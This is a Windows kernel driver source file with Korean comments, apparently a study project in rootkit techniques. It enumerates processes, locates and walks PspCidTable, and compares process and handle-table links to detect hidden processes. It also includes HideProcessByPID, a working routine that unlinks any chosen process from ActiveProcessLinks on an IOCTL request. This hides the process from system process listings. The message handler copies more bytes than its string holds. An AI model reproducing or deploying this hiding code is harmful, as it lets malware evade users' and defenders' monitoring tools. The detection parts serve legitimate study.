#include "source.h"

//SYMLINK 문자열 정의 
#define SYMLINK L"\\DosDevices\\ioctltest"

MAL_GLOBAL g_MalGlobal;

//오류 무시 
#pragma warning(push)
#pragma warning(disable:4100)
extern "C" NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING RegistryPath) {

	UNICODE_STRING   deviceSymLink;
	UNICODE_STRING   deviceName;
	UNICODE_STRING	 ZwQuerySystemInformationName;
	NTSTATUS retStatus = STATUS_SUCCESS;
	PDEVICE_OBJECT deviceObject = NULL;

	//미 사용 파라미터를 에러처리 하지 않으면 오류 발생 
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	//디버그 메시지 출력
	dmsg("Driver Loaded!");

	//전역변수 구조체 초기화 
	RtlZeroMemory(&g_MalGlobal, sizeof(MAL_GLOBAL));

	//구조체에 드라이버 오브젝트 저장 
	g_MalGlobal.DriverObject = DriverObject;

	//유니코드 타입 문자열 초기화  -> IoCreateSymbolicLink 함수 인자로 유니코드 타입 문자열 넘어가야함 
	RtlInitUnicodeString(&deviceSymLink, SYMLINK);
	RtlInitUnicodeString(&deviceName, L"\\Device\\testName");

	//PDEVICE_OBJECT 생성 
	retStatus = IoCreateDevice(
		DriverObject,
		0,
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&deviceObject);

	//NTSTATUS 결과 SUCCESS 인지 검사 
	if (!NT_SUCCESS(retStatus)) {
		dmsg("IoCreateDevice Fail!");
		return retStatus;
	}

	//구조체에 디바이스 오브젝트 저장 
	g_MalGlobal.DeviceObject = deviceObject;

	//심볼릭 링크 생성 
	retStatus = IoCreateSymbolicLink(&deviceSymLink, &deviceName);

	//NTSTATUS 결과 SUCCESS 인지 검사 
	if (!NT_SUCCESS(retStatus)) {
		dmsg("IoCreateSymLink Fail!");
		return retStatus;
	}

	//ZwQuerySystemInformation 함수 포인터 가져오기 
	RtlInitUnicodeString(&ZwQuerySystemInformationName, L"ZwQuerySystemInformation");
	ZwQuerySystemInformation = (ZwQuerySystemInformation_t) MmGetSystemRoutineAddress(&ZwQuerySystemInformationName);
	if (ZwQuerySystemInformation) {
		dmsg("Get ZwQuerySystemInformation Pointer Success");
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== Function Address : %lp ====== \n", ZwQuerySystemInformation);
	}
	else 
		dmsg("Get ZwQuerySystemInformation Pointer Fail");

	DriverObject->DriverUnload = UnloadMyDriver;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = myIOCTL;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = createHandler;

	return 0;
}

//프로세스 목록 가져오는 함수 - ZwQuerySystemInformation 함수 
void getProcessList() {
	NTSTATUS retStatus = STATUS_SUCCESS;
	ULONG BufferSize, BackwardPID = 0;

	//전달받을 데이터 크기 구함
	retStatus = ZwQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemProcessInformation, NULL, 0, &BufferSize);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== Sysinfo Class : %d ====== \n", (SYSTEM_INFORMATION_CLASS)SystemProcessInformation);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== BufferSize : %ld ====== \n", BufferSize);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== NT RETURN : %x ====== \n", retStatus);
	//반환값 체크 
	if (retStatus == STATUS_INFO_LENGTH_MISMATCH) {
		dmsg("Get Buffer Size Complete!");
		if (BufferSize) {
			//커널 메모리 동적할당 
			PVOID PoolMem = ExAllocatePoolWithTag(PagedPool, BufferSize, POOL_TAG);
			dmsg("Pool Memory Complete !");
			if (PoolMem) {
				//데이터 전달받음 
				retStatus = ZwQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemProcessInformation, PoolMem, BufferSize, &BufferSize);
				if (NT_SUCCESS(retStatus))				{
					dmsg("Get Process Info Complete!");
					//할당한 메모리 공간 SYSTEM_PROCESS_INFORMATION 구조체에 대입 
					SYSTEM_PROCINFO *ProcessEntry = (SYSTEM_PROCINFO*)PoolMem;
					do {
						ULONG TargetPID = 0;
						if (ProcessEntry->ImageName.Length) {
							TargetPID = (ULONG)ProcessEntry->UniqueProcessId;
							DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== DRIVER MESSAGE : PNAME - %ws | PID - %lx ====== \n",(ProcessEntry->ImageName.Buffer), TargetPID);
							CheckLinkValidate(TargetPID, BackwardPID);
						}
						
						ProcessEntry = (SYSTEM_PROCINFO *)((BYTE*)ProcessEntry + ProcessEntry->NextEntryOffset);
						BackwardPID = TargetPID;
					} while (ProcessEntry->NextEntryOffset);
				}
			}
		}
	}
}

//테이블 데이터 디코딩 함수 
PVOID DecodeTableData(PVOID* EncodeAddr) {
	PVOID retResult = nullptr;
	
	retResult = (PVOID)( (  (ULONGLONG)((ULONGLONG)*EncodeAddr >> 0x10 ) + 0xFFFF000000000000 ) & 0xFFFFFFFFFFFFFFF0);
	return retResult;
};

//TableLayer1단계
void TableLayer1(PVOID TablePointer) {
	PEPROCESS TargetProcess = nullptr;
	PVOID* TargetAddress = nullptr;
	/*ULONGLONG PID = 0;*/
	HANDLE PID = nullptr;
	UCHAR* PName=nullptr;
	UNICODE_STRING targetFName;
	
	//PsGetProcessImageFileName 함수 포인터 가져오기 
	RtlInitUnicodeString(&targetFName, L"PsGetProcessImageFileName");
	PsGetProcessImageFileName = (PsGetProcessImageFileName_t)MmGetSystemRoutineAddress(&targetFName);

	for (ULONGLONG i = 0; i < 256; i++) {
		TargetAddress = (PVOID*)((ULONGLONG)TablePointer + (i * 16));
		
		if (*TargetAddress) {
			TargetProcess = (PEPROCESS)DecodeTableData(TargetAddress);
			//오프셋 말고 다른 기준점 이용해서 찾아올 수 있게 재구성 필요함 
			//PID =  (ULONGLONG) * ((PVOID*)((ULONGLONG)TargetProcess + 0x440))
			
			PID = PsGetProcessId(TargetProcess);
			
			if ((ULONG)PID < 0xE0000000) {
				PName = PsGetProcessImageFileName(TargetProcess);
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "**** PNAME : %s - PID : %llx **** \n", PName, PID);
			}

			/*if (PID < 0xFFFFFFFC) {
				PName = (UCHAR*)((ULONGLONG)TargetProcess + 0x5a8);
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "**** PNAME : %s PID : %llx **** \n", PName,PID);
			}*/
				
		}
	}
};

//TableLayer2단계
void TableLayer2(PVOID* TablePointer) {
	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "**** TableLayer Level 2 Traverse **** \n");
	for (ULONGLONG i = 0; i<512 ; i++) {
		//대상 주소 따라갔을 때 값 존재하는지 체크 
		PVOID * TargetAddress =  (PVOID*) ( (ULONGLONG)TablePointer + (i*8) );
		if (*TargetAddress == 0) {
			break;
		}
		else {
			/*DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "----- TableLayer Level 2 Traverse : %d ----- \n",i);*/
			TableLayer1( (PVOID)*TargetAddress );
		}
	}
};

//TableLayer3단계
void TableLayer3(PVOID* TablePointer) {

};

//PspCidTable 주소 전달받아 테이블 레이어 데이터 가져와 순회
PVOID TraversePspCidTable(ULONGLONG* PspCidTable) {
	PVOID* TableCode = nullptr;
	PVOID* TableAddr = nullptr;
	int LayerLevel = 0;

	//TableCode 찾아오기
	TableCode = (PVOID*)((ULONGLONG)(*PspCidTable) + 0x8);
	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "**** TableCode: %p **** \n", TableCode);
	//dmsg("===== Get PspCidTable Traverse Process List =====");
	//TableCode에서 LayerLevel 분리
	LayerLevel = (ULONGLONG)(*TableCode) & 3;
	TableAddr = (PVOID*)( (ULONGLONG)(*TableCode) - LayerLevel);
	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "**** TableAddr: %p **** \n", TableAddr);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "**** LayerLevel: %d **** \n", LayerLevel+1);

	switch (LayerLevel) {
		case 0:
			//TableLayer1(TableAddr);
			break;
		case 1:
			TableLayer2(TableAddr);
			break;
		case 2:	
			break;
	}
	return 0;
};


//PspCidTable 실제 주소 찾아오기
ULONGLONG GetPspCidTableAddresss() {
	UNICODE_STRING targetFName;
	PVOID PsLookupProcessByProcessId = nullptr;
	PVOID PspReferenceCidTableEntry = nullptr;
	PVOID* tmpAddr = nullptr;
	ULONGLONG FuncOffset = 0;
	ULONGLONG PspCidTableOffset = 0;
	
	//PsLookupProcessByProcessId 함수 포인터 가져오기 
	RtlInitUnicodeString(&targetFName, L"PsLookupProcessByProcessId");
	PsLookupProcessByProcessId = MmGetSystemRoutineAddress(&targetFName);
	
	//PspReferenceCidTableEntry 찾기위해 바이트코드에서 상대주소 오프셋 찾아옴.
	tmpAddr = (PVOID*)((ULONGLONG)PsLookupProcessByProcessId + 0x25);
	FuncOffset = (int)*tmpAddr;

	//PspReferenceCidTableEntry 주소 연산
	PspReferenceCidTableEntry = (PVOID)((ULONGLONG)PsLookupProcessByProcessId + 0x29 + FuncOffset);
	
	//PspCidTable 상대주소 오프셋 찾아옴
	tmpAddr = (PVOID*)((ULONGLONG)PspReferenceCidTableEntry + 0x1d);
	FuncOffset = (int)*tmpAddr;

	PspCidTableOffset = (ULONGLONG) ((ULONGLONG)PspReferenceCidTableEntry + 0x21 + FuncOffset);
	
	/*PspCidTableOffset = (int)*tmpAddr;
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "**** PspCidTable: %lx **** \n", (int)PspCidTableOffset);*/
	
	return PspCidTableOffset;
}


//pid 전달받아 ActiveProcesslinks 와 HandleTableList의 FLINK BLINK 비교하여 검증
BOOLEAN CheckLinkValidate(ULONG TargetPID, ULONG BackwardPID) {
	PLIST_ENTRY ActiveProcessLinks, HandleTableList = nullptr;
	BOOLEAN retStatus = 0;
	PVOID* FrontwardProcess[2] = { nullptr, };
	PVOID* BackwardProcess[2] = { nullptr, };


	//PID 인자로 각 링크 가져옴
	HandleTableList = GetHandleTableListbyPID(TargetPID);
	ActiveProcessLinks = GetProcessLinksbyPID(TargetPID);	

	//HandleTableList 링크 따라간 TableObject +0x10 -> PID 
	BackwardProcess[0] = (PVOID*)((ULONGLONG)(HandleTableList->Blink) + 0x10);
	FrontwardProcess[0] = (PVOID*) ((ULONGLONG)(HandleTableList->Flink) + 0x10 );
	
	//ActiveProcessLinks 따라간 주소 - 0x8 -> PID 
	BackwardProcess[1] = (PVOID*)((ULONGLONG)(ActiveProcessLinks->Blink) - 0x8);
	FrontwardProcess[1] = (PVOID*)((ULONGLONG)(ActiveProcessLinks->Flink) - 0x8);
	
	//링크 PID 비교 - 비교시 형변환까지 한 다음 비교해주는게 좋음.  	
	if ((ULONG) *(BackwardProcess[0]) != (ULONG) *(BackwardProcess[1]) ) {
		//이전 프로세스 PID 까지 비교하여 어떤 링크가 변조되었는지 체크 
		if ((ULONG) * (BackwardProcess[0]) != BackwardPID){
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "**** HandleList Backward PID Mismatch: %lx **** \n", (ULONG)*BackwardProcess[0]);
		}
		else {
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "****  ProcessLink Backward PID Mismatch: %lx **** \n", (ULONG)*BackwardProcess[1]);
		}
		retStatus = 1;
	}

	if ((ULONG) *(FrontwardProcess[0]) != (ULONG) *(FrontwardProcess[1]) ) {
		retStatus = 1;
	}
	
	return retStatus; 
};

//pid 전달받아 ActiveProcesslinks 반환 
PLIST_ENTRY GetProcessLinksbyPID(ULONG targetPID) {
	PLIST_ENTRY retEntry = nullptr;
	UNICODE_STRING targetFName;
	PEPROCESS targetProcess;
	NTSTATUS retStatus = STATUS_SUCCESS;
	PVOID PsGetProcessId = nullptr;
	PVOID* offsetPointer = nullptr;

	int offset;

	//PsLookupProcessByProcessId 함수 포인터 가져오기 
	RtlInitUnicodeString(&targetFName, L"PsLookupProcessByProcessId");
	PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)MmGetSystemRoutineAddress(&targetFName);
	if (PsLookupProcessByProcessId) {
		retStatus = PsLookupProcessByProcessId(targetPID, &targetProcess);
	}
	else {
		return nullptr;
	}
	
	//PsGetProcessId 함수 포인터 가져오기 
	RtlInitUnicodeString(&targetFName, L"PsGetProcessId");
	PsGetProcessId = MmGetSystemRoutineAddress(&targetFName);
	
	//PsGetProcessId 함수 시작주소부터 3바이트 위치에서 2바이트 가져옴
	//PEPROCESS 시작주소로부터 해당 2바이트만큼 오프셋 떨어진 곳에 UniqueProcessId 주소 들어있음 
	offsetPointer = (PVOID*)((ULONGLONG)PsGetProcessId + 3);
	offset = (USHORT)*offsetPointer + 8;

	//ActiveProcessLinkAddress 가져옴
	retEntry= (PLIST_ENTRY)((ULONGLONG)targetProcess + offset);
	return retEntry;
};

//pid 전달받아 HandleTableList 반환
PLIST_ENTRY GetHandleTableListbyPID(ULONG targetPID) {
	PLIST_ENTRY retEntry = nullptr;
	UNICODE_STRING targetFName;
	PEPROCESS targetProcess;
	NTSTATUS retStatus = STATUS_SUCCESS;
	PVOID PsGetProcessDebugPort = nullptr;
	PVOID* offsetPointer = nullptr;
	PVOID* ObjectTable = nullptr;

	ULONG offset;

	//PsLookupProcessByProcessId 함수 포인터 가져오기 
	RtlInitUnicodeString(&targetFName, L"PsLookupProcessByProcessId");
	PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)MmGetSystemRoutineAddress(&targetFName);
	if (PsLookupProcessByProcessId) {
		retStatus = PsLookupProcessByProcessId(targetPID, &targetProcess);
	}
	else {
		return nullptr;
	}

	//PsGetProcessDebugPort 함수 포인터 가져오기 
	RtlInitUnicodeString(&targetFName, L"PsGetProcessDebugPort");
	PsGetProcessDebugPort = MmGetSystemRoutineAddress(&targetFName);
	
	//PsGetProcessDebugPort 함수 시작주소부터 3바이트 위치에서 2바이트 가져옴
	//PEPROCESS 시작주소로부터 해당 2바이트만큼 오프셋 떨어진 곳에 DebugPort  주소 들어있음 
	offsetPointer = (PVOID*)((ULONGLONG)PsGetProcessDebugPort + 3);

	//DebugPort  로부터 8바이트 떨어진 위치가 ObjectTable 
	offset = ( (USHORT)*offsetPointer - 8 );
	ObjectTable = (PVOID *)((ULONGLONG)targetProcess + offset);
	
	//ObjectTable 구조체 + 0x18 위치에 HandleTableList 존재
	retEntry = (PLIST_ENTRY)((ULONGLONG)(*ObjectTable) + 0x18);
	return retEntry;
};


//pid 전달받아 해당 프로세스 숨김 
ULONGLONG HideProcessByPID(ULONG targetPID) {
	UNICODE_STRING targetFName;
	PEPROCESS getPEP;
	NTSTATUS retStatus = STATUS_SUCCESS;
	PVOID PsGetProcessId = nullptr;
	PVOID* offsetPointer = nullptr;
	PLIST_ENTRY APLA,tmpNode;

	ULONG offset;

	//PsLookupProcessByProcessId 함수 포인터 가져오기 
	RtlInitUnicodeString(&targetFName, L"PsLookupProcessByProcessId");
	PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)MmGetSystemRoutineAddress(&targetFName);
	if (PsLookupProcessByProcessId) {
		dmsg("Get PsLookupProcessByProcessId Pointer Success");
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== Function Address : %lp ====== \n", ZwQuerySystemInformation);
		retStatus = PsLookupProcessByProcessId(targetPID, &getPEP);
	}
	else {
		dmsg("Get PsLookupProcessByProcessId Pointer Fail");
		return 0;
	}
		

	if(retStatus == STATUS_SUCCESS)
		dmsg("PsLookupProcessByProcessId Success");
	else
		dmsg("PsLookupProcessByProcessId fail");

	//PsGetProcessId 함수 포인터 가져오기 
	RtlInitUnicodeString(&targetFName, L"PsGetProcessId");
	PsGetProcessId = MmGetSystemRoutineAddress(&targetFName);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== PsGetProcssId ADDRESS : %p ====== \n", (PsGetProcessId));
	
	//PsGetProcessId 함수 시작주소부터 3바이트 위치에서 2바이트 가져옴
	//PEPROCESS 시작주소로부터 해당 2바이트만큼 오프셋 떨어진 곳에 UniqueProcessId 주소 들어있음 
	offsetPointer = (PVOID*)((ULONGLONG)PsGetProcessId + 3);
	//UniqueProcessId 로부터 8바이트 떨어진 위치가 ActiveProcessLinkAddress
	offset = (USHORT)*offsetPointer + 8;
	
	//ActiveProcessLinkAddress 가져옴
	APLA = (PLIST_ENTRY)((ULONGLONG)getPEP + offset);
	/*DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== FLINK : %p ====== \n", (APLA->Flink));
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== BLINK : %p ====== \n", (APLA->Blink));*/

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== PEPROCESS : %p ====== \n", getPEP );

	//각 프로세스별 Flink , Blink 교체
	//Flink 따라가서 해당 프로세스의 Blink를 현재 프로세스의 Blink로 교체
	//Blink 따라가서 해당 프로세스의 Flink를 현재 프로세스의 Flink로 교체

	tmpNode = APLA->Flink;
	tmpNode->Blink = APLA->Blink;
	tmpNode = APLA->Blink;
	tmpNode->Flink = APLA->Flink;

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== Link Swap Done! ====== \n");
	//커널 오류 방지를 위해 Flink와 Blink가 서로를 가리키게 만듬 
	
	/*APLA->Flink = APLA->Blink;
	APLA->Blink = tmpNode->Flink;*/

	return (ULONGLONG)getPEP + offset;
}



//드라이버 언로드 함수 
void UnloadMyDriver(PDRIVER_OBJECT DriverObject) {
	dmsg("Driver Unloaded!");
	if (g_MalGlobal.DeviceObject != nullptr)
	{
		//심볼릭 링크 값 초기화 해주고 변수 할당 해제
		UNICODE_STRING Symlink = { 0, };
		RtlInitUnicodeString(&Symlink, SYMLINK);
		IoDeleteSymbolicLink(&Symlink);

		//디바이스 오브젝트 삭제 
		IoDeleteDevice(g_MalGlobal.DeviceObject);
	}
	return ;
}

//IOCTL 대응 함수 
NTSTATUS myIOCTL(IN PDEVICE_OBJECT DeviceObject, IN PIRP irp) {
	PIO_STACK_LOCATION pStack;
	NTSTATUS retStatus = STATUS_SUCCESS;
	ULONG ControlCode;
	PWCHAR InBuf;
	PWCHAR OutBuf;
	PWCHAR OutMsg = L"Message from driver\n";
	ULONG InBufLength,OutBufLength,OutMsgLength;

	//IRP 내부에 존재하는 IO스택 포인터위치 반환 
	pStack = IoGetCurrentIrpStackLocation(irp);

	InBufLength = pStack->Parameters.DeviceIoControl.InputBufferLength;
	OutBufLength = pStack->Parameters.DeviceIoControl.OutputBufferLength;

	//유저 어플리케이션에서 전달한 컨트롤 코드 찾아옴
	ControlCode = pStack->Parameters.DeviceIoControl.IoControlCode;

	//컨트롤 코드에 따른 동작 대응
	switch (ControlCode) {
	case IOCTL_MESSAGE:
		dmsg("IOCTL EVENT!");

		//유저에서 넘어온 메시지 
		InBuf = (PWCHAR) irp->AssociatedIrp.SystemBuffer;

		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== DATA FROM USER : %S ====== \n", InBuf);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "===== MESSAGE LENGTH : %d ====== \n", InBufLength);
		
		OutMsgLength = (ULONG) wcslen(OutMsg)*2 +1;
		//유저로 넘길 메시지 
		OutBuf = (PWCHAR) irp->AssociatedIrp.SystemBuffer;
		//메시지 복사 
		RtlCopyBytes(OutBuf, OutMsg, OutBufLength);
		//전달받은 outbufLen과 실제 전달될 문자열의 길이 비교하여 전달될 메시지 길이 조정
		irp->IoStatus.Information = (OutBufLength < OutMsgLength? OutBufLength : OutMsgLength);

		break;
	case IOCTL_PROCLIST : 
		dmsg("PROCLIST!");
		getProcessList();
		break;
	case IOCTL_PROCINFO : 
		dmsg("PROCINFO!");
		//유저에서 넘어온 메시지 
		InBuf = (PWCHAR)irp->AssociatedIrp.SystemBuffer;
		HideProcessByPID( (ULONG) _wtoi(InBuf) );
		break;
	case IOCTL_FINDHIDE:
		//유저에서 넘어온 메시지 
		InBuf = (PWCHAR)irp->AssociatedIrp.SystemBuffer;
		/*CheckLinkValidate((ULONG)_wtoi(InBuf));*/
		break;
	case IOCTL_CIDTABLE:
		InBuf = (PWCHAR)irp->AssociatedIrp.SystemBuffer;
		dmsg("CIDTABLE");
		TraversePspCidTable( (ULONGLONG*) GetPspCidTableAddresss());
		
		break;
	}

	//IRP 동작 완료 처리 함수 
	IoCompleteRequest(irp, IO_NO_INCREMENT);

	return retStatus;
}

//Create 대응 함수 - 함수동작 성공시 STATUS_SUCESS를 반환해주어야 한다. 
NTSTATUS createHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP irp) {
	//I/O 상태 변경 
	irp->IoStatus.Status = STATUS_SUCCESS;

	//IRP 동작 완료 처리 함수 
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	
	dmsg("CREATE EVENT!");
	return STATUS_SUCCESS;
}

//컴파일/빌드 오류 무시  -> UNREFERENCED_PARAMETER(DriverObject) 안써도됨
#pragma warning(pop)